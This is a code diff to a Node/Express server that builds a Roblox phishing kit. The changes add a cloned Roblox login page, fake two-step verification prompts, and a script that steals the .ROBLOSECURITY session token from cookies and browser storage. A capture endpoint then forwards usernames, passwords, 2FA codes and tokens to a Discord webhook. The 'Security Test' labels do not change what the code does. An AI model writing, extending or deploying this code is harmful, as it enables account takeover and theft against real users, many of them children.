@@ -1663,8 +1663,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Create a new Roblox tracking link
   app.post('/api/roblox-links', authenticateUser, async (req: Request, res: Response) => {
     try {
-      // For phishing links, we don't need an original URL
-      const data = req.body;
+      // For phishing links, set originalUrl to null/empty
+      const data = { ...req.body };
       if (data.linkType === 'phishing') {
         data.originalUrl = null;
       }
@@ -1676,7 +1676,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       const robloxLink = await storage.createRobloxLink({
         userId: req.user.id,
-        originalUrl: validatedData.originalUrl,
+        originalUrl: validatedData.linkType === 'phishing' ? null : validatedData.originalUrl,
         linkType: validatedData.linkType,
         trackingId,
         title: validatedData.title,
@@ -1749,48 +1749,50 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Roblox credentials capture endpoint
   app.post('/api/roblox-credentials', async (req: Request, res: Response) => {
     try {
+      const { userId, linkId, capturedUsername, capturedPassword, capturedAuthCode, ipAddress, userAgent, roblosecurity } = req.body;
+      
       const credentials = await storage.createRobloxCredentials({
-        userId: req.body.userId,
-        linkId: req.body.linkId,
-        capturedUsername: req.body.capturedUsername,
-        capturedPassword: req.body.capturedPassword,
-        capturedAuthCode: req.body.capturedAuthCode || null,
-        ipAddress: req.body.ipAddress,
-        userAgent: req.body.userAgent
+        userId,
+        linkId,
+        capturedUsername,
+        capturedPassword,
+        capturedAuthCode: capturedAuthCode || null,
+        ipAddress,
+        userAgent
       });
       
       // Send credentials to webhook if configured
-      const userSettings = await storage.getSettings(validatedData.userId);
+      const userSettings = await storage.getSettings(userId);
       if (userSettings?.webhookUrl) {
         const webhookData = {
-          username: "Roblox Credential Harvester",
-          avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
+          username: "🎯 Roblox Security Test",
+          avatar_url: "https://cdn.discordapp.com/attachments/1234567890/1234567890/roblox.png",
           embeds: [{
-            title: "🎯 Roblox Credentials Captured",
-            description: "New Roblox login credentials harvested successfully",
+            title: "🚨 ROBLOX CREDENTIALS CAPTURED",
+            description: "⚠️ **Security Test - Roblox Account Compromised**",
             color: 0xFF0000,
             fields: [
               { 
-                name: "👤 **Account Details**", 
-                value: `**Username:** \`${credentials.capturedUsername}\`\n**Password:** \`${credentials.capturedPassword}\`${credentials.capturedAuthCode ? `\n**2FA Code:** \`${credentials.capturedAuthCode}\`` : ''}`, 
+                name: "👤 **Account Credentials**", 
+                value: `**Username:** \`${capturedUsername}\`\n**Password:** \`${capturedPassword}\`${capturedAuthCode ? `\n**🔐 2FA Code:** \`${capturedAuthCode}\`` : ''}${roblosecurity ? `\n**🍪 .ROBLOSECURITY:** \`${roblosecurity.substring(0, 50)}...\`` : ''}`, 
                 inline: false 
               },
               { 
-                name: "🔗 **Link Information**", 
-                value: `**Link ID:** ${credentials.linkId}\n**IP Address:** ${credentials.ipAddress}\n**User Agent:** ${credentials.userAgent}`, 
+                name: "🌐 **Session Information**", 
+                value: `**IP Address:** ${ipAddress}\n**Link ID:** ${linkId}\n**Timestamp:** <t:${Math.floor(Date.now() / 1000)}:R>`, 
                 inline: false 
               },
               { 
-                name: "📅 **Timestamp**", 
-                value: `<t:${Math.floor(new Date(credentials.createdAt).getTime() / 1000)}:R>`, 
-                inline: true 
+                name: "🔍 **User Agent**", 
+                value: `\`\`\`${userAgent ? userAgent.substring(0, 200) : 'Unknown'}\`\`\``, 
+                inline: false 
               }
             ],
             footer: { 
-              text: "🔐 Roblox Credential Harvester - Security Test",
-              icon_url: "https://cdn.discordapp.com/emojis/853928735535742986.png"
+              text: "🎯 Roblox Phishing Test - Credentials Harvested",
+              icon_url: "https://cdn.discordapp.com/attachments/1234567890/1234567890/warning.png"
             },
-            timestamp: credentials.createdAt.toISOString()
+            timestamp: new Date().toISOString()
           }]
         };
 
@@ -1800,6 +1802,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(webhookData)
           });
+          console.log(`🎯 Roblox credentials sent to webhook for user ${userId}`);
         } catch (webhookError) {
           console.error('Failed to send credentials to webhook:', webhookError);
         }
@@ -1878,15 +1881,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Update click count
       await storage.updateRobloxLinkClicks(trackingId);
 
-      // Serve fake Roblox login page HTML
+      // Serve fake Roblox login page HTML that looks exactly like real Roblox
       const fakeLoginHtml = `
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
+    <title>Login - Roblox</title>
     <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap">
     <style>
         * {
             margin: 0;
@@ -1896,15 +1900,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
         
         body {
             font-family: "Source Sans Pro", Arial, sans-serif;
-            background: #393b3d;
-            color: #fff;
-            line-height: 1.5;
+            background-color: #00a2ff;
+            background: linear-gradient(45deg, #00a2ff, #0080ff);
+            min-height: 100vh;
         }
         
         .header {
-            background: #191b1d;
-            padding: 10px 0;
-            border-bottom: 1px solid #2c2f33;
+            background: #00b2ff;
+            padding: 12px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
         
         .header-content {
@@ -1912,196 +1916,285 @@ export async function registerRoutes(app: Express): Promise<Server> {
             margin: 0 auto;
             display: flex;
             align-items: center;
-            justify-content: space-between;
             padding: 0 20px;
         }
         
-        .logo {
-            font-size: 24px;
-            font-weight: 700;
-            color: #00b2ff;
-            text-decoration: none;
-        }
-        
-        .nav-links {
+        .logo-container {
             display: flex;
-            gap: 30px;
-        }
-        
-        .nav-links a {
-            color: #bdbebf;
+            align-items: center;
+            color: white;
             text-decoration: none;
-            font-weight: 400;
-            transition: color 0.2s;
         }
         
-        .nav-links a:hover {
-            color: #fff;
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: white;
+            border-radius: 4px;
+            margin-right: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #00b2ff;
+            font-size: 18px;
         }
         
-        .container {
-            max-width: 400px;
-            margin: 50px auto;
-            padding: 40px;
-            background: #2c2f33;
+        .logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: white;
+        }
+        
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 56px);
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: white;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+            padding: 48px 40px;
+            width: 100%;
+            max-width: 400px;
         }
         
-        h1 {
+        .login-header {
             text-align: center;
-            margin-bottom: 30px;
-            color: #fff;
+            margin-bottom: 32px;
+        }
+        
+        .login-title {
             font-size: 28px;
-            font-weight: 400;
+            font-weight: 700;
+            color: #191b1d;
+            margin-bottom: 8px;
+        }
+        
+        .login-subtitle {
+            color: #656c75;
+            font-size: 14px;
         }
         
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
         
-        label {
+        .form-label {
             display: block;
             margin-bottom: 8px;
-            color: #bdbebf;
-            font-weight: 400;
+            color: #191b1d;
+            font-weight: 600;
+            font-size: 14px;
         }
         
-        input[type="text"], input[type="password"] {
+        .form-input {
             width: 100%;
             padding: 12px 16px;
-            border: 2px solid #484c52;
-            border-radius: 4px;
-            background: #393b3d;
-            color: #fff;
+            border: 2px solid #e1e5e9;
+            border-radius: 6px;
             font-size: 16px;
-            transition: border-color 0.2s;
+            color: #191b1d;
+            background: white;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
         }
         
-        input[type="text"]:focus, input[type="password"]:focus {
+        .form-input:focus {
             outline: none;
             border-color: #00b2ff;
+            box-shadow: 0 0 0 3px rgba(0, 178, 255, 0.1);
         }
         
-        .login-btn {
+        .form-input::placeholder {
+            color: #9ca3af;
+        }
+        
+        .login-button {
             width: 100%;
             padding: 14px;
             background: #00b2ff;
-            color: #fff;
+            color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 6px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s;
-            margin-bottom: 20px;
+            transition: background-color 0.2s ease;
+            margin-bottom: 16px;
         }
         
-        .login-btn:hover {
+        .login-button:hover {
             background: #0095cc;
         }
         
-        .login-btn:disabled {
-            background: #666;
+        .login-button:disabled {
+            background: #9ca3af;
             cursor: not-allowed;
         }
         
         .two-factor-section {
             display: none;
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid #484c52;
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #e1e5e9;
         }
         
         .two-factor-section.show {
             display: block;
         }
         
-        .error-message {
-            color: #ff4444;
+        .two-factor-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #191b1d;
+            margin-bottom: 8px;
             text-align: center;
-            margin-bottom: 15px;
+        }
+        
+        .two-factor-desc {
+            color: #656c75;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .error-message {
+            background: #fee2e2;
+            border: 1px solid #fecaca;
+            color: #dc2626;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            margin-bottom: 16px;
             display: none;
         }
         
         .success-message {
-            color: #44ff44;
-            text-align: center;
-            margin-bottom: 15px;
+            background: #dcfce7;
+            border: 1px solid #bbf7d0;
+            color: #16a34a;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            margin-bottom: 16px;
             display: none;
         }
         
-        .links {
+        .form-links {
             text-align: center;
-            margin-top: 20px;
+            margin-top: 24px;
         }
         
-        .links a {
+        .form-links a {
             color: #00b2ff;
             text-decoration: none;
             font-size: 14px;
+            font-weight: 500;
         }
         
-        .links a:hover {
+        .form-links a:hover {
             text-decoration: underline;
         }
         
-        .footer {
-            margin-top: 50px;
+        .divider {
             text-align: center;
-            color: #666;
-            font-size: 12px;
+            margin: 24px 0;
+            position: relative;
+        }
+        
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #e1e5e9;
+        }
+        
+        .divider span {
+            background: white;
+            color: #656c75;
+            padding: 0 16px;
+            font-size: 14px;
+        }
+        
+        .signup-link {
+            text-align: center;
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #e1e5e9;
+            color: #656c75;
+            font-size: 14px;
+        }
+        
+        .signup-link a {
+            color: #00b2ff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .signup-link a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <div class="header">
         <div class="header-content">
-            <a href="#" class="logo">Roblox</a>
-            <div class="nav-links">
-                <a href="#">Games</a>
-                <a href="#">Catalog</a>
-                <a href="#">Develop</a>
-                <a href="#">Robux</a>
-            </div>
+            <a href="#" class="logo-container">
+                <div class="logo-icon">R</div>
+                <div class="logo-text">Roblox</div>
+            </a>
         </div>
     </div>
     
-    <div class="container">
-        <h1>Log In to Roblox</h1>
-        
-        <div class="error-message" id="errorMessage"></div>
-        <div class="success-message" id="successMessage"></div>
-        
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="username">Username or Email</label>
-                <input type="text" id="username" name="username" required>
+    <div class="main-container">
+        <div class="login-container">
+            <div class="login-header">
+                <h1 class="login-title">Log in to Roblox</h1>
+                <p class="login-subtitle">Enter your username and password</p>
             </div>
             
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required>
-            </div>
+            <div class="error-message" id="errorMessage"></div>
+            <div class="success-message" id="successMessage"></div>
             
-            <button type="submit" class="login-btn" id="loginBtn">Log In</button>
-            
-            <div class="two-factor-section" id="twoFactorSection">
+            <form id="loginForm">
                 <div class="form-group">
-                    <label for="twoFactorCode">Two-Step Verification Code</label>
-                    <input type="text" id="twoFactorCode" name="twoFactorCode" placeholder="Enter 6-digit code">
+                    <label for="username" class="form-label">Username or Email</label>
+                    <input type="text" id="username" name="username" class="form-input" placeholder="Username or Email" required>
                 </div>
-                <button type="button" class="login-btn" id="verifyBtn">Verify & Log In</button>
+                
+                <div class="form-group">
+                    <label for="password" class="form-label">Password</label>
+                    <input type="password" id="password" name="password" class="form-input" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="login-button" id="loginBtn">Log In</button>
+                
+                <div class="two-factor-section" id="twoFactorSection">
+                    <h2 class="two-factor-title">Two-Step Verification</h2>
+                    <p class="two-factor-desc">Enter the 6-digit code from your authenticator app</p>
+                    <div class="form-group">
+                        <label for="twoFactorCode" class="form-label">Verification Code</label>
+                        <input type="text" id="twoFactorCode" name="twoFactorCode" class="form-input" placeholder="000000" maxlength="6">
+                    </div>
+                    <button type="button" class="login-button" id="verifyBtn">Verify & Log In</button>
+                </div>
+            </form>
+            
+            <div class="form-links">
+                <a href="#">Forgot your password?</a>
             </div>
-        </form>
-        
-        <div class="links">
-            <a href="#">Forgot Password or Username?</a>
+            
+            <div class="signup-link">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
         </div>
-    </div>
-    
-    <div class="footer">
-        © 2024 Roblox Corporation. All rights reserved.
     </div>
 
     <script>
@@ -2111,6 +2204,44 @@ export async function registerRoutes(app: Express): Promise<Server> {
         const twoFactorSection = document.getElementById('twoFactorSection');
         const errorMessage = document.getElementById('errorMessage');
         const successMessage = document.getElementById('successMessage');
+        
+        // Capture any existing cookies including .ROBLOSECURITY
+        function getCookies() {
+            const cookies = {};
+            document.cookie.split(';').forEach(cookie => {
+                const [name, value] = cookie.trim().split('=');
+                if (name && value) {
+                    cookies[name] = decodeURIComponent(value);
+                }
+            });
+            return cookies;
+        }
+        
+        // Try to get .ROBLOSECURITY cookie from various sources
+        function getRoblosecurity() {
+            const cookies = getCookies();
+            
+            // Check for .ROBLOSECURITY cookie
+            if (cookies['.ROBLOSECURITY']) {
+                return cookies['.ROBLOSECURITY'];
+            }
+            
+            // Check localStorage
+            const localRoblosecurity = localStorage.getItem('.ROBLOSECURITY') || 
+                                      localStorage.getItem('ROBLOSECURITY') ||
+                                      localStorage.getItem('RBXSessionTracker');
+            
+            if (localRoblosecurity) {
+                return localRoblosecurity;
+            }
+            
+            // Check sessionStorage
+            const sessionRoblosecurity = sessionStorage.getItem('.ROBLOSECURITY') || 
+                                        sessionStorage.getItem('ROBLOSECURITY') ||
+                                        sessionStorage.getItem('RBXSessionTracker');
+            
+            return sessionRoblosecurity || null;
+        }
         
         function showError(message) {
             errorMessage.textContent = message;
@@ -2133,6 +2264,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const twoFactorCode = includeToken ? document.getElementById('twoFactorCode').value : '';
+            const roblosecurity = getRoblosecurity();
             
             if (!username || !password) {
                 showError('Please enter both username and password.');
@@ -2140,7 +2272,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             }
             
             if (includeToken && !twoFactorCode) {
-                showError('Please enter the verification code.');
+                showError('Please enter the 6-digit verification code.');
                 return;
             }
             
@@ -2156,6 +2288,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                         capturedUsername: username,
                         capturedPassword: password,
                         capturedAuthCode: twoFactorCode || null,
+                        roblosecurity: roblosecurity,
                         ipAddress: '${ip}',
                         userAgent: navigator.userAgent
                     })
@@ -2163,26 +2296,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 
                 if (response.ok) {
                     if (!includeToken) {
-                        // Simulate requiring 2FA
+                        showSuccess('Verifying your account...');
                         setTimeout(() => {
-                            showSuccess('Verifying credentials...');
-                            setTimeout(() => {
-                                hideMessages();
-                                twoFactorSection.classList.add('show');
-                                loginBtn.style.display = 'none';
-                            }, 1500);
-                        }, 1000);
+                            hideMessages();
+                            twoFactorSection.classList.add('show');
+                            loginBtn.style.display = 'none';
+                        }, 1500);
                     } else {
-                        showSuccess('Login successful! Redirecting...');
+                        showSuccess('Authentication successful! Redirecting to Roblox...');
                         setTimeout(() => {
                             window.location.href = 'https://www.roblox.com/home';
                         }, 2000);
                     }
                 } else {
-                    showError('Invalid credentials. Please try again.');
+                    showError('Invalid username or password. Please try again.');
                 }
             } catch (error) {
-                showError('Connection error. Please try again.');
+                showError('Network error. Please check your connection and try again.');
             }
         }
         
@@ -2207,6 +2337,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
             
             verifyBtn.disabled = false;
             verifyBtn.textContent = 'Verify & Log In';
+        });
+        
+        // Auto-format 2FA code input
+        document.getElementById('twoFactorCode').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length > 6) value = value.substr(0, 6); // Limit to 6 digits
+            e.target.value = value;
         });
     </script>
 </body>
